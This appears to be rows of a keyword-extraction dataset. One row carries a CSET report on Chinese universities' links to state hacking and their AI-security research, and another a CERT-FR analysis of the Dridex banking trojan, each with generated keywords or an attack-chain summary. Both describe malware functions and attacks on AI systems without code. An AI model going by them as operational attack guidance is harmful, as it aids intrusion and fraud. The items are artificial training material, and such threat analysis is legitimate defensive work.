evidence point towards research on ML applications for cyber operations by the Cyberspace Security Science and Technology Research Institute. First, a recent job posting for a training program manager ( ) gave preference to applicants with a background in cybersecurity and a strong understanding of AI security.55 Second,Center for Security and Emerging Technology | 15the description of responsibilities for part of the program includes “AI-based vulnerability discovery and testing,” the same offensive application the director noted in his article.56 Taken together, the high-level publication on AI and cybersecurity in an MSS periodical, the job posting seeking applicants with a cross-disciplinary background, and the research institute’s description of its own work provides strong evidence that researchers are working on AI for cyber offensive and defensive purposes. In light of one program conducting “APT attack testing and defense” and SJTU’s past relationship with PLA cyber operators, it is reasonable to conclude such research could directly support state-sponsored hacking.Xidian University ()Connections to the Security ServicesGuangdong ITSEC, a division of the MSS 13th Bureau and the managing organization for APT3, started working with Xidian University in 2017 to offer a jointly administered graduate program under the Network and Information Security School ( ).57 Xidian University awards degrees and handles admissions; Guangdong ITSEC facilitates hands-on education and pairs graduate students with MSS employees serving as mentors.58 Together, Guangdong ITSEC and Xidian University graduate students pursue research projects that meet the “actual needs” ( ) of Guangdong ITSEC—solving technical problems to enable the MSS’s work. The relationship between Guangdong ITSEC and Xidian University is unusual; not only is the jointly- administered degree a novel program, but the two institutions are located more than 1,000 miles apart. Xidian University’s involvement may be explained by Guangdong ITSEC’s collection priorities. APT3 changed its mission to targeting residents of Hong Kong in 2015.59 Practicing offensive cyber skills on Hong Kongers is no different than an internship with the Ministry of Public Security since China considers Hong Kong to be an “internal affair.” This is conjecture, however. There are no reports that Xidian University supported past operations and this is the first report establishing the university’s relationship with the Guangdong ITSEC.Center for Security and Emerging Technology | 16Xidian University students are not limited to just one division of the MSS 13th Bureau, however. The university also established a joint research laboratory and internship program with Shaanxi ITSEC in 2017. The two committed to “jointly launch information security assurance and posture evaluation services for China, Shaanxi Province, and Shaanxi's prefecture-level cities"" among many other responsibilities.60 Shaanxi ITSEC is not connected to any publicly known APT groups or hacking campaigns.Xidian University’s relationship with PLA information warfare units extends at least a decade. In 2011, Xidian University established a relationship with the 3PLA and 4PLA, both now under the PLA Strategic Support Force, when it constructed the Collaborative Innovation Center of Information Sensing and Understanding ( ).61 This project was a continuation of its historic ties to the CCP—Mao Zedong established the forerunner to Xidian University in 1931.62Research on AI/ML + CybersecurityTwo Xidian University professors claim an affiliation with China’s security services and are conducting research on AI and cybersecurity.Dr. Zhang Yuqing () joined Xidian University after having first served as the director of the National Computer Network Intrusion Prevention Center (), a government body tasked with securing computer networks, and serving as the Deputy Director of the National Engineering Experimental Laboratory for Technology to Prevent and Cure Computer Viruses ().63 Zhang’s research at Xidian is focused on network confrontation, vulnerability discovery and exploitation, and the intersection of AI and cybersecurity.64 In his most recently published academic paper, Zhang and researchers from the National Computer Network Intrusion Prevention Center—his former employer—surveyed more than 200 papers on using AI for cybersecurity tasks.65 The paper analyzed possible applications of ML for data mining, vulnerability discovery and exploitation, and automated patching of software vulnerabilities. Zhang and his colleagues determined that using AICenter for Security and Emerging Technology | 17for automated vulnerability discovery was likely the most useful application and made recommendations for future research to overcome the technology’s (2018) limitations at the time. The project would likely prove useful to one of its funders, the Unclassified Projects Program at the Key State Laboratory for Information Security (), which could use the research to inform grant distributions to other academics working on ML and cybersecurity. The actual impact of the report is unknown, however.66A second academic, Dr. Yang Chao (), has active connections to the security services and conducts research on AI applications for cybersecurity.67 While at Xidian University, Dr. Yang has submitted more than 20 software vulnerabilities to China’s National Vulnerability Database (CNNVD, )—a division of the MSS 13th Bureau. Fifteen of these received certification from the government as critical vulnerabilities, though most were apparently related to payment systems within China.68 His work on cybersecurity earned him a national defense research project funded by the now-defunct PLA General Armaments Department Development Fund and a current “high-level consulting position” with the MSS 13th Bureau Xibei office.69 Yang describes his research as including “data-driven AI intelligent cyber threat detection and [developing a] “hunter” defense system architecture; AI and big data analysis-based detection of malignancies in encrypted traffic; machine learning-based encrypted traffic (SSL, Tor, VPN, ShadowSocks) / private internet protocol recognition and investigation; data analysis and machine learning-based cyberspace virtual persona recognition, matching, and investigation.”70 Each of Yang’s research topics tightly intertwines ML and cybersecurity and could be put to good use in his consulting position at the MSS 13th Bureau’s Xibei office.Academics at Xidian University without acknowledged or known ties to the security services are also conducting similar research. A paper focused on defensive research published in 2019 proposed and demonstrated using machine learning to classify malware samples based on patterns in behavior.71 The resulting model could be used to detect attacks from new malware with behaviors similar to that of older, known malware. Research using machine learningCenter for Security and Emerging Technology | 18for behavioral detection of new attacks is a common theme in current research on AI and cybersecurity.72 Another Xidian University paper from 2017 proposed a similar ML-based solution to classifying malware, though that research focused on overcoming inadequate training data.73Other academics are conducting research on less defensive, more dual-use topics. An article from 2019 compared algorithms that conduct membership interference attacks on ML systems, an exploit that allows attackers to determine if a given piece of data was part of the model’s training data.74 For example, a membership interference attack on a facial recognition system may allow the attacker to determine if the system can identify a particular face.75 Though the researchers qualified their research by demonstrating how to defend against such attacks, the paper concluded with examples of attacking commercially available algorithms to evaluate which data sets had been used to train targeted models.Zhejiang University ()Connections to the Security ServicesZhejiang University is a highly-respected, internationally renowned school for cybersecurity studies. Unsurprisingly, the PLA vigorously recruited graduates of its program at the time Mandiant published its APT1 report in 2013.76 A report prepared for the U.S.-China Economic and Security Review Commission by Northrop Grumman found that Zhejiang University received funding from three secretive programs for information security research: China’s National 242 Information Security Program ( 242  ), the Ministry of State Security 115 Program ( 115), and the National s219 Information Security Application Demonstration Project ( s219 ).77 The report also concludes that universities which received these funds were selected to conduct “sensitive research and development with information security and information warfare applications.”78Though never tied to a specific hacking campaign, this report finds that Zhejiang University has collaborated on research with members of the PLA SSF. Zhejiang University academics co-Center for Security and Emerging Technology | 19authored a research paper with members of PLA Unit 61646 in 2018.79 Also known as the Air Reconnaissance Bureau, Unit 61646 was originally organized under the PLA General Staff Department’s 2nd Department and responsible for military intelligence until its reorganization in 2015-16.80 The joint paper evaluated SM4, a then-common encryption protocol that played an “important role as a national encryption standard” in China.81 Together, Zhejiang University academics and members of Unit 61646 concluded that SM4 encryption protocol is weak and easy to circumvent.Research on AI/ML + CybersecurityClasses taught at, and research conducted by, Zhejiang University suggest the school’s graduates are well prepared for jobs involving cyber operations, making them great recruits for China’s security services and national champion companies alike. Indeed, the joint Zhejiang University-Fudan University team beat the team from Carnegie Mellon in the 2020 DEFCON Capture-the-Flag competition.82Cybersecurity is not the only relevant area of focus at Zhejiang University, as the school is also teaching undergraduate students how to attack and defend AI/ML systems.83 Under its Applied Security curriculum, Zhejiang University teaches AI-related courses including: Algorithm and Model Security, Backdoors in Models, Data Poisoning, Adversarial Example Attacks, Measures for Defending Against Adversarial Example Attacks, and Certifiable Security for AI ().84 In addition, Zhejiang University’s Applied Security program is conducting research on “malicious machine learning” ().85Each of these topics is central to protecting or attacking AI systems. Data poisoning attacks target the training data of a model; manipulating the inputs in such a way that the deployed system fails to function properly.86 Undetected data poisoning attacks can slow the development of a system, increasing costs and undermining its functionality. Other vulnerabilities allow attackers to make models fail in specific, predictable ways. Backdoors in models allow for the attackers to designate a specific outcome given a certain trigger.87 A backdoor attack against aCenter for Security and Emerging Technology | 20facial recognition model could allow anyone wearing a purple hat to be recognized as a particular person, for example. Defending against these types of attacks is critical for any organization or business integrating AI models into operations.In the course of their degrees on cybersecurity, AI and information security at Zhejiang University, students pick up some government-focused skills along the way. The program offers courses on intelligence88 entitled: “the evolution and definition of strategic intelligence, the relationship between induction and deduction in intelligence research, intelligence classification, and crafting [intelligence] reports.""89 Understanding the intelligence cycle and writing intelligence products is likely to be of little relevance to employees outside the national security sector. Combined with classes on AI vulnerabilities—which require familiarity with how systems can be attacked—the evidence suggests that Zhejiang University students are well-prepared for a job in the security services.90Full-time faculty at Zhejiang University who teach AI/ML attack and defense classes are on the cutting-edge of research in the area. Dr. Ji Shouling (), an international participant on eight US National Science Foundation-funded research projects, recipient of the China’s 1000 Young Talents Program (2017) and the Zhejiang 1000 Talent Program (2016), has his own research institute at Zhejiang University which conducts research on AI for cybersecurity.91 In an arrangement that typifies the issues of China’s talent programs, Ji simultaneously holds a research faculty position at Georgia Institute of Technology. One non-NSF paper published by Ji proposes a tool called “VulnSniper,” which uses neural networks to find new software vulnerabilities.92 It is one example from dozens of papers published by Ji’s research program at Zhejiang University.Dr. Yang Ziqi (), another professor in the cybersecurity program, focuses his research on the attack and defense of AI systems. After receiving his doctorate from Singapore National University, Yang conducted research for the Singapore Cybersecurity Agency National Lab, Kaspersky Labs, and Huawei. Yang’s research on AI security includes model inversion,Center for Security and Emerging Technology | 21membership interference, adversarial attack and defense, and backdoors in models.93 Membership interference attacks pair well with Yang’s other research into model inversion of commercially available facial recognition systems.94 Together, these two techniques can determine whether a particular face is recognized by a targeted facial recognition system. Other applications of Yang’s research include using AI to trace the origins of malware binaries based on information about the compiling author.95In addition to full-time professors conducting research, Zhejiang University has hosted many guest lectures on attacking AI systems and defending their vulnerabilities. Topics from guest lecturers have included: Neural Network Inversion in Adversarial Settings96, Attack and Defense of Deep Neural Network Models97, Federated Learning-Oriented User Privacy Attacks98, Data Set Inference and Reconstruction Attacks in Online Learning99, and Stealthy Attacks Against Automatic Speech Recognition.100 These attacks pose myriad problems for users of AI systems. Neural network inversions reveal technical details about the data used to train a specific model—potentially exposing sensitive or classified data used in training the model.101 Other attacks, rather than exposing information, manipulate mundane systems to the attacker’s advantage. The presentation on “Stealthy Attacks Against Automatic Speech Recognition” systems demonstrated how to embed secret commands in songs, which when played, can direct virtual assistants—like Google Home, Amazon Echo, or Apple’s Siri—to perform certain tasks. Though research of this nature is common in cybersecurity, the relationship between Zhejiang University and China’s cyber operators is uncommon. Moreover, a recent CSET report demonstrates how hard it is to defend AI systems—vulnerabilities are pervasive and defensive techniques are often only temporary patches.102 As more organizations and governments deploy AI systems, the attack surface for such techniques will grow.Center for Security and Emerging Technology | 22Harbin Institute of Technology ()Connections to Security ServicesThe Mandiant APT1 report named Harbin Institute of Technology (HIT) as a recruitment center for Chinese cyber operators in 2013.103 HIT is not alleged to have supported specific operations, though the university’s ties to the military would make any such support unsurprising. As one of the Seven Sons of National Defense—a collection of universities with deep historical ties to the defense industry and PLA—HIT has received an institutional top- secret clearance to work on military projects.104 HIT’s cybersecurity school touts working on nine government-funded research projects, including research done on behalf of the now-defunct PLA General Armaments Department Key Laboratory Fund and the MSS, among other research funders.105 Legacy webpages show many graduates of HIT’s cybersecurity school from 2008 to 2014 went to work for the PLA’s 54th Research Institute, formerly part of the General Staff Department’s 4th Department (Electronic Intelligence, or ELINT), an organization folded into the PLA Strategic Support Force in 2015.106 The U.S. DOJ indicted four members of the 54th Research Institute in 2020 for the 2017 Equifax hack.107Research on AI/ML + CybersecurityAcademics based at the Harbin Institute of Technology published few research articles on ML applications for cybersecurity or AI vulnerabilities. Instead, the vast majority of its faculty’s publications (49 of 51) examined the application of AI to other fields, including a significant focus on the medical field. The two papers published on ML and cybersecurity rehashed recurrent themes in the field. One group of researchers built a machine learning model to detect and categorize software vulnerabilities.108 The other publication proposed using AI to create an intrusion detection system based on behavior analysis.109The relative scarcity of publications on ML and cybersecurity topics is surprising, given HIT’s reputation as a cutting-edge cybersecurity school. It may well be the case that the university’sCenter for Security and Emerging Technology | 23institutional top-secret clearance prevents the publication of such research. Another CSET report on China’s defense technology workforce found that China’s central government designated a Microsoft-HIT Artificial Intelligence and Machine Translation Joint Laboratory as a Key State Laboratory in 2006.110 Moreover, the same report found that Microsoft Research Asia worked with HIT to create its computer science curriculum and provided training to professors in 2018 and 2019 on AI and natural language processing technology.111 In fact, the presence of such international partnerships may be the reason that HIT shies away from publishing or even conducting such research.But there are more indicators that HIT is performing, but not publishing, research on AI and cybersecurity. The Computer Application/Cyberspace Security Research Center, an affiliate of the cybersecurity school, conducts “research on key technologies in privacy-protecting machine learning.”112 Though the phrase is ambiguous, other sources use the same phrase when discussing the issue of ML model security.113 Here, the description of HIT’s research center denotes work on securing machine learning models from attacks that may divulge information from training data or other aspects of the model. To secure these models, researchers attack newly-developed defenses to test their efficacy. The acknowledgment of defensive research is also a tacit acknowledgment of offensive capabilities, though the attack methodologies used are not necessarily new or developed in- house.Center for Security and Emerging Technology | 24ConclusionsExamination of China’s AI/ML research and computer network operations to date demonstrates that six key universities play a major role in not only building technical competencies, but also in moving the research out of the lab and operationalizing it. Research currently conducted at these six universities demonstrates interest in both sides of the AI/ML and cybersecurity divide—ML-based offensive and defensive techniques, and the attack and defense of AI systems themselves. In addition to technical research from all six institutions, two of the schools published high-level strategic papers on the intersection of machine learning and cybersecurity. Xidian University’s paper, funded by the Key State Laboratory for Information Security Unclassified Projects Fund, conducted a wide-ranging review of current (2018) research, determining machine learning could make a significant impact on vulnerability discovery and exploitation.114 The conclusions of that paper were reiterated in an MSS publication written by faculty from Shanghai Jiao Tong University, where affiliated programs are conducting research on AI-based vulnerability discovery and “APT attack and defense.”115 The state of technical research in China is such that work on machine learning and computer network operations has moved from the research lab to strategic policy publications.The close relationships between universities and the state shortens the path to operationalizing new techniques and provides the security services quick access to talented researchers. As nations and organizations deploy AI systems with unknown vulnerabilities, China’s hacking teams will have new avenues of attack. Conversely, China’s government and private sector will also seek to defend their own systems. Enhanced protection of China’s computer networks and AI systems will be at least one outcome of conducting this research. Though research benefits both offensive and defensive applications, the relationships of these institutions with the security services augur the use of such knowledge in future hacking operations.Center for Security and Emerging Technology | 25AuthorDakota Cary is a Research Analyst at the Center for Security and Emerging Technology.AcknowledgmentsFor feedback and assistance, we would like to thank John Bansemer, Ben Buchanan, Scott Harold, Ben Murphy, Anna Puglisi, Helen Toner, Emily Weinstein, Ryan Fedasiuk, Benjamin Pollack, and Kady Arthur.© 2021 by the Center for Security and Emerging Technology. This work is licensed under a Creative Commons Attribution-Non Commercial 4.0 International License.To view a copy of this license, visit url Document Identifier: doi: 10.51593/2020CA010Center for Security and Emerging Technology | 26Endnotes1 Elsa Kania, “A Force for Cyber Anarchy or Cyber Order? —PLA Perspectives on ‘Cyber Rules,’” Jamestown Foundation, July 6, 2016, url GATT.2 ,“,” accessed January 15, 2021, url IntrusionTruth, “Who Is Mr Gu?” Intrusion Truth, January 10, 2020. url 2015 conversion rate of approximately RMB 6.3 to USD 1.5 IntrusionTruth, “Who Is Mr Gu?”6 IntrusionTruth, “Who Is Mr Gu?”7 Fred Plan, Nalani Fraser, Jacqueline O’Leary, Vincent Cannon, Ben Read, “APT40: Examining a China-Nexus Espionage Actor,” FireEye Blogs, March 4, 2019. url a-china-nexus-espionage-actor.html.8 Evidence for each school’s relationship with the security services are available in the Findings section of this paper.9 For example, the Beijing Institute of Technology posted a message of thanks to its Information and Electronics Program from the Ministry of State Security for their “significant contribution” to its work. (url In late 2020, the US Bureau of Industry and Security placed the school on its End-User list for acquiring technology for the PLA. Similarly, Sichuan University touts providing zero-day vulnerabilities to “relevant government ministries” on its homepage. (url Small, ad-hoc contributions are likely the most common way universities support China’s computer network operations. Still other schools’ contributions fall somewhere between supplying vulnerabilities and setting up shell companies. Tsinghua University computers conducted network reconnaissance on US targets ahead of a trade meeting, but the university was not connected to a persistent campaign or entity. (url This one-off type of operation may be indicative of a professor moonlighting for extra income or a student trying to pad their resume for future jobs—such activity does not constitute an Advanced Persistent Threat.10 Elsa Kania, “A Force for Cyber Anarchy or Cyber Order?”Center for Security and Emerging Technology | 2711 Zach Dorfman, “Tech Giants Are Giving China a Vital Edge in Espionage.” Foreign Policy, December 23, 2020, url tech-giants-process-stolen-data-spy-agencies/.12 e.g. University websites, social media posts, files uploaded to file sharing sites, and academic publications accessible through the CNKI database.13 Reports of China’s military hacking operations prior to 2016 refer to the Third General Staff Department (3PLA) as the military’s cyber espionage department. The PLA SSF incorporated 3PLA into its structure in 2016. John Costello, “The Strategic Support Force: China’s Information Warfare Service,” Jamestown Foundation, February 8, 2016, url China’s civilian intelligence agency, the Ministry of State Security, conducts cyber operations through its 13th Bureau, which is known publicly as the China Information Technology Evaluation Center (CNITSEC). Peter Mattis identifies China Information Technology Evaluation Center (ITSEC) () as the Ministry of State Security’s 13th Bureau. The 13th Bureau is responsible for “research and development of investigative tools.” Regional bureaus are adorned with their provincial name. Peter Mattis and Matthew Brazil, Chinese Communist Espionage: An Intelligence Primer (Annapolis, MD: Naval Institute Press, 2019).14 Bureau of Industry and Security, “Entity List,” Department of Commerce, accessed January 15, 2021, url guidance/lists-of-parties-of-concern/entity-list.15 IntrusionTruth, “Who Is Mr Gu?”16 , , , , and ,“ DDoS ,”, no. 8 (2019): 7, url Ellen Nakashima, “Security Firm Finds Link between China and Anthem Hack,” The Washington Post, February 27, 2015, url ThreatConnect Research Team, “The Anthem Hack: All Roads Lead to China,” ThreatConnect, February 27, 2015, url ThreatConnect Research Team, “The Anthem Hack.”20 ThreatConnect Research Team, “The Anthem Hack.”21 ThreatConnect Research Team, “The Anthem Hack.”22 Deep Panda may be associated with APT19, but this is not confirmed. The MITRE Corporation, “Deep Panda,” MITRE ATT&CK, accessed January 15, 2021, url for Security and Emerging Technology | 2823 ThreatConnect Research Team, “The Anthem Hack.”24 Bryan Krekel, Patton Adams, and George Bakos, “Occupying the Information High Ground: Chinese Capabilities for Computer Network Operations and Cyber Espionage” (U.S.-China Economic and Security Review Commission, March 7, 2012), 62, url “,” Southeast University, accessed January 15, 2021, url yb1/list.psp.25 Krekel, Adams, and Bakos, “Occupying the Information High Ground,” 60-62.26 “,” Southeast University, accessed January 15, 2021, url “,” Southeast University.28 “,” Southeast University, accessed January 15, 2021, url 8BTV?type=image.29 “,” Southeast University, accessed January 15, 2021, url “,” Southeast University, accessed January 15, 2021, url “,” Southeast University.32 “,” Southeast University, accessed January 15, 2021, url “,” Southeast University, accessed January 15, 2021, url “,” Southeast University, accessed January 15, 2021, url “,” Southeast University, accessed January 15, 2021, url “,” Southeast University.37 John Markoff and David Barboza, “2 China Schools Said to Be Tied to Online Attacks,” The New York Times, February 19, 2010, url C8VV.Center for Security and Emerging Technology | 2938 Melanie Lee, “Top China College in Focus with Ties to Army’s Cyber-Spying Unit.” Reuters, March 24, 2013, url Lee, “Top China College in Focus.”40 Nicole Perlroth, “2nd China Army Unit Implicated in Online Spying,” The New York Times, June 9, 2014, url“,”- , accessed January 15, 2021, url ( ，，， APT ，) Thanks to Ben Murphy for this translation.42 “”,” -, accessed January 15, 2021, url (、、).43 “,”, accessed January 15, 2021, url “,” , accessed January 15, 2021, url “,”, accessed January 15, 2021, url , , , et al., “ URL ,” , no. 08 (2018): 1918–23, url , , and . “  URL ,” , no. 2 (2020): 25, url CTFV.47  and , “,” , no. 4 (2018): 1, url ，，and , “,” , 2019, url , , and , “ Webshell ,”  , no. 1 (2019): 32, url , , and , “,”  , no. 12 (2019): 21, url  and , “ Tor ,” , no. 12 (2019): 26, url for Security and Emerging Technology | 3052  and , “,” , no. 1 (2019): 29, url Researchers used a recurrent neural network to train GenPASS, a tool for brute-forcing password attacks more easily.53 , , and App , “： ,” accessed January 15, 2021, url ，， .55 “,” - ,accessed January 15, 2021, url (、[…] ).56 “,” - , accessed January 15, 2021, url ( ，，，APT ，). Thanks to Ben Murphy for this translation.57 “,” , accessed January 15, 2021, url cn%2Finfo%2F1112%2F1492.htm.58 “,” ”; Mattis and Brazil, Chinese Communist Espionage: An Intelligence Primer, 77; Insikt Group, “Recorded Future Research Concludes Chinese Ministry of State Security behind APT3,” Recorded Future, May 17, 2017, url The MITRE Corporation. “APT3.” MITRE ATT&CK, accessed February 12, 2021, url “,” , accessed January 15, 2021, url (、 ). Thanks to Ben M for this translation. (A full translation of the agreement is available here).61 “ ,” GuanCha, accessed January 15, 2021, url .62 Edward Wong, “University in Xi’an Opens School of Cyberengineering,” The New York Times, January 6, 2015.Center for Security and Emerging Technology | 3163 “,” , accessed January 15, 2021, url url 3FBK?type=image (,  ).64 “,” .65 , , , , , ,  et al., “ ,”  39, no. 8 (2018): 1–17, url (url 436x.2018137).66 ((2017-ZD-01)).67 “,” ,accessed January 15, 2021, url QYUS?type=image. Thanks to Ben M for this translation. “ -,” ,accessed January 15, 2021, url 9PGY?type=image.68 Insikt Group, “China’s Cybersecurity Law Gives the Ministry of State Security Unprecedented New Powers over Foreign Technology,” Recorded Future, August 31, 2017, url “,”  ().70 “-,”  ( AI  ““、 AI  、（SSL、Tor、VPN、ShadowSocks）/ 、、 ““). Thanks to Ben M for this translation.71 , , , and , “ ,”  40, no. 6 (2019): 148–59, url (url “Behavioral detection of malware + machine learning,” Google Scholar, accessed January 15, 2021, url tion+of+malware+%2B+machine+learning&btnG=.73 , , , and , “,”  54, no. 10 (2017): 2255-2267, url , , and , “,”  10, no. 10 (2020): url for Security and Emerging Technology | 3275 Ram Shankar, Siva Kumar, David O’Brien, Jeffrey Snover, Kendra Albert, and Salome Viljoen, “Failure Modes in Machine Learning,” Microsoft, November 11, 2019, url “APT1: Exposing One of China’s Cyber Espionage Units “ (FireEye, February 19, 2013), 11, url “ 61398 ,” , accessed January 15, 2021, url (Zhejiang University Recruitment Event for PLA Unit 61398).77 Krekel, Adams, and Bakos, “Occupying the Information High Ground,” 60–62.78 Krekel, Adams, and Bakos, “Occupying the Information High Ground,” 60–62.79 , , , and , “SM4  Cache ,”   5, no. 4 (2018): 430-441, url F&id=272.80 Peter Mattis and Elsa Kania, “Modernizing Military Intelligence: Playing Catchup (Part Two),” Jamestown Foundation, December 21, 2016, url , , , and , “SM4  Cache .”82 “DEF CON® Hacking Conference - Capture the Flag Archive,” DEFCON, accessed January 15, 2021, url “ ,” ,” accessed January 15, 2021, url KJ9H?type=image.83 Course catalogues for graduate students and doctoral candidates are unavailable, but likely share comparable content.84 “,” , accessed January 15, 2021, url Thanks to Ben Murphy for this translation.85 “,” , accessed January 15, 2021, url Shankar et al., “Failure Modes in Machine Learning.”87 Shankar et al., “Failure Modes in Machine Learning.”88 Here, “intelligence” is related to intelligence agencies and the national security use of the term, not AI.Center for Security and Emerging Technology | 3389 “,” , accessed January 15, 2021, url Andrew Lohn, ""Hacking AI"" (Center for Security and Emerging Technology, December 2020), url Hacking-AI.pdf.91 “Index - NESA - Network System Security & Privacy Lab,” NESAlab, accessed January 15, 2021, url Yanjun Wu, Mutian Yang, Xu Duan, Jingzheng Wu, Zhiqing Rui, Shouling Ji, and Tianyue Luo, “VulSniper: Focus Your Attention to Shoot Fine-Grained Vulnerabilities,” Proceedings of the Twenty-Eighth International Joint Conference on Artificial Intelligence Main track, 2019, 4665–71, url “,” , accessed January 15, 2021, url “,” .95 “,” .96 Ziqi Yang, “()（CCS2019）Neural Network Inversion in Adversarial Setting,” , accessed January 15, 2021, url MVMU?type=image.97 Ling Liu, “() Robust Deep Learning Against Deception,”  , accessed January 15, 2021, url , “(),” , accessed January 15, 2021, url “() Updates-Leak: ,”  , accessed January 15, 2021, url “(),” , accessed January 15, 2021, url Shankar et al., “Failure Modes in Machine Learning.”102 Lohn, ""Hacking AI.""103 Mandiant, “APT1: Exposing One of China’s Cyber Espionage Units.”104 Alex Joske, “The China Defence Universities Tracker” (Australian Strategic Policy Institute, November 25, 2019), url defence-universities-tracker.Center for Security and Emerging Technology | 34105 “,” （）, accessed January 15, 2021, url Krekel, Adams, and Bakos, “Occupying the Information High Ground,"" 60–62; National 242 Information Security Program ( 242 ), Ministry of State Security 115 Program ( 115), and the National s219 Information Security Application Demonstration Project ( s219 ).106 “,” , accessed January 15, 2021, url Bureau of Industry and Security, “Entity List”; Mattis and Kania, “Modernizing Military Intelligence.”107 Department of Justice Office of Public Affairs, “Chinese Military Personnel Charged with Computer Fraud, Economic Espionage and Wire Fraud for Hacking into Credit Reporting Agency Equifax,” U.S. Department of Justice, February 10, 2020, url , , and , “.”  , no. 5 (2019): 93, url  and , “,”  8, no. 2 (2018): 129–33, url Ryan Fedasiuk and Emily Weinstein, “Universities and the Chinese Defense Technology Workforce” (Center for Security and Emerging Technology, December 2020), url Universities-and-the-Chinese-Defense-Technology-Workforce.pdf.111 Fedasiuk and Weinstein, “Universities and the Chinese Defense Technology Workforce.”112 “（）/  2020 /,” , accessed January 15, 2021, url ( ) Thanks to Ben Murphy for this translation.113 The previously mentioned publication by the research institute director at Shanghai Jiao Tong University, for example.114 , , , , , ,  et al., “ ,”  39, no. 8 (2018): 1–17, url (url 436x.2018137).115 “,” - , accessed January 15, 2021, url for Security and Emerging Technology | 35 ","{'phrases': ['State', 'talent', 'universities', 'CON', 'cybersecurity research', 'funding', 'data', 'Gu', 'academic research', 'researchers', 'systems', 'detection', 'vulnerabilities', 'the hack', 'Hacking', 'operational capabilities', 'AI/ML', 'ML techniques', 'cyber operations', 'Espionage', 'surveillance', 'the development', 'lab'], 'target': 'State; talent; universities; CON; cybersecurity research; funding; data; Gu; academic research; researchers; systems; detection; vulnerabilities; the hack; Hacking; operational capabilities; AI/ML; ML techniques; cyber operations; Espionage; surveillance; the development; lab.'}"
Dridex; persistence; peer; a list; PE; a list; the payload; DLL; the core module; the core module; functions; the core module; addition; the modules; a keylogger; information; the user; a keystroke; a password; the compromised bank account; the stolen data; Pony botnets; access; the malware.,"['1. Initial infection via phishing email or other vector like exploit kits. The phishing emails are sent by botnets like CraP2P/Necurs and Cutwail controlled by Dridex operators or affiliates. 2. The phishing email contains a malicious attachment or link. If opened/clicked, it downloads the Dridex loader module. 3. The loader installs the main Dridex payload and additional modules. It also downloads an initial peer list to connect to the command and control infrastructure. 4. Dridex collects reconnaissance and gathers credentials via keylogging, web injections into banking sites, etc. 5. The stolen banking credentials are leveraged by the operators to perform unauthorized bank transfers and steal money. 6. In some cases, Dridex may download additional payloads like ransomware onto compromised machines. 7. The peer-to-peer botnet infrastructure helps preserve anonymity of the command servers and bolster resilience. 8. Affiliates pay Evil Corp to use subsets of the Dridex botnets and botnet IDs for distribution. Revenue is shared. 9. Dridex continues evolving with new modules, exploits, obfuscation, and evasion techniques to sustain operations. ']","Extract the keywords: TLP:WHITETHE MALWARE DRIDEX:ORIGINS AND USES17/07/2020TLP:WHITETLP:WHITEThe malware Dridex: origins and usesSommaire sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses1 The malware Dridex 1.1 Changes in functionality since 2014 1.1.1 Functionality Surfacing in June 2014, Dridex is the ﬁfth variant of the banking trojan Bugat, active between 2010 and 2013 [1], enhanced with features speciﬁc to GameOverZeuS (GoZ) [2], which was active until 2014.Its primary functionality is as a stealer, i.e. to steal online banking access codes1, and enable threat actors to make fraudulent transfers from the compromised bank accounts. To that end, Dridex deploys at least three methods [3] :• · Injection of an HTML script into the legitimate webpages of online banks that have previously been com-promised, which displays malicious forms to customers asking them to provide their access codes;• · Redirection towards a malicious page masquerading as the bank2;• · Interception of the server response from the bank’s website and relay towards the threat actors’ PHP server,which injects the code there.1.1.2 Modularity Dridex is made up of several modules, including:• A loader, tasked with:– downloading a list of peers3; – initial recognition within the information system (IS); – installing the payload; – downloading the additional modules.• · A payload (also known as the core module, which contains the integrated functions and to which othermodules may be added in order to expand its functionality.The main functions integrated within Dridex’s core module are as follows:• A keylogger, which provides the threat actors with context about the victim (screenshots, keyboard input, etc.);• Harvesting information and tampering with content on websites (web injection), via interaction with the Internet browsers. According to Bromium [4], Dridex is believed to have at least ﬁve Web injection4 techniques.This functionality can primarily be extended by the following modules:• VNC: this module supplies Virtual Network Computing (VNC)5 support for the threat actor’s remote access tothe victim’s workstation;• SOCKS: this gives Dridex a SOCKS proxy support6; • Pony: based on the Pony malware7, this can steal access codes;1As well as personal data and account balances. 2Technique previously leveraged by and most likely borrowed from the trojan Dyre. 3In the context of Dridex peer-to-peer pseudo-network operations. 4DLL order hijacking, process hollowing, PE injection, thread execution hijacking and AtomBombing. 5System for viewing and controlling the desktop environment of a remote computer, using the RFB protocol for communications. 6The network protocol Secured over credential based kerberos (SOCKS) enables a program to use the services of a ﬁrewall during an exchangewith an external server7Malware and controller of the botnet active since 2011, specialising in the theft of access codes and crypto-assets, but also in the distribution of malware, v1.9 of which leaked at the end of 2012 [5]. Pony has distributed such malware as GoZ, Necurs, Dyre, Vawtrak, Cryptolock and Cribit. In 2013, there were several Pony botnets.17/07/2020Page 3 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses• Kill OS: deployed across systems identiﬁed as belonging to researchers or automated malware analysis systems,it erases the master boot record (MBR) from the hard drive in a bid to sabotage the infected workstation;• Spammer: this is harnessed to send spam emails;• Email stealer: this is run to harvest the victim’s emails.Fig. 1.1 : General composition1.1.3 Development Dridex is constantly being upgraded. Since 2014, its developers have added regular updates and patches. For example:• In November 2014, Dridex embraced not only digital signature theft but also the P2P protocol [6].• Dridex is the ﬁrst known malware to have implemented, in February 2017, a new code injection techniquediscovered in October 2016, AtomBombing [4].• Attack vectors are changing apace. Accordingly, the changeover from Dridex v3 to v4 in early 2017 camehand-in-hand with addition of the vulnerability 0-day MS Word (CVE-2017-0199)8 [4, 7].1.2 Botnet use Dridex employs various Peer-to-Peer (P2P) botnets9 10 composed of workstations it compromises [9]. Their P2P architecture has three (layers), which makes the end command and control (C2 backend) machines more difficult to identify, so bolstering the infrastructure’s resilience.The C2 backend, otherwise known as the root infrastructure, contains the database and management logic of the botnet. It comprises around 24 servers [10]. It transmits new updates of the Pony, Kill OS, Spammer and Email Stea- ler modules to the nodes. The C2 frontends (admin node), which operate like reverse proxies, and comprise around 15 servers [10], communicate with the nodes, of which there are believed to be several hundred. These are composed of infected systems (bots) and represent the ﬁrst communication layer in which the rest of the infected systems are in contact. They communicate together to maintain the network, extend it, distribute the VNC and SOCKS modules and transfer queries to the C2 frontends.8Vulnerability enabling the concealment of malicious instructions in a document saved in .RTF format. 9For a clearer grasp of the notion of botnet, an assessment of the threat botnets pose can be found on the CERT-FR website [8]. 10In botnets using this architecture, zombie machines do not communicate directly with the C2 infrastructure, but with other zombie machines deﬁned in an updatable list of peers. As such, only a small number of machines are in contact with the C2 infrastructure run directly by the threat actor. These 